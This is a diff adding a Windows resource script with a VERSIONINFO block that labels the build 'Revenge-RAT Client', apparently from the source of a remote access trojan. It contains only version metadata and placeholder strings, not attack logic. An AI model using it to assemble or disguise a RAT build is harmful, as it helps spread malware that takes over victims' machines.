@@ -1,0 +1,28 @@
+½
+1 VERSIONINFO
+FILEVERSION 0,0,0,3
+PRODUCTVERSION 0,0,0,3
+FILEOS 0x40004
+FILETYPE 0x1
+{
+BLOCK "StringFileInfo"
+{
+	BLOCK "040904b0"
+	{
+		VALUE "CompanyName", "RV"
+		VALUE "FileDescription", "RV"
+		VALUE "FileVersion", "Revenge-RAT"
+		VALUE "InternalName", "Copyright © Revenge-RAT 2016.exe"
+		VALUE "LegalCopyright", "copy"
+		VALUE "OriginalFilename", "Copyright © Revenge-RAT 2016.exe"
+		VALUE "LegalTrademarks", "oada" 
+		VALUE "ProductName", "prodect"
+		VALUE "ProductVersion", "Revenge-RAT Client"
+		}
+}
+
+BLOCK "VarFileInfo"
+{
+	VALUE "Translation", 0x0409 0x04B0
+}
+}
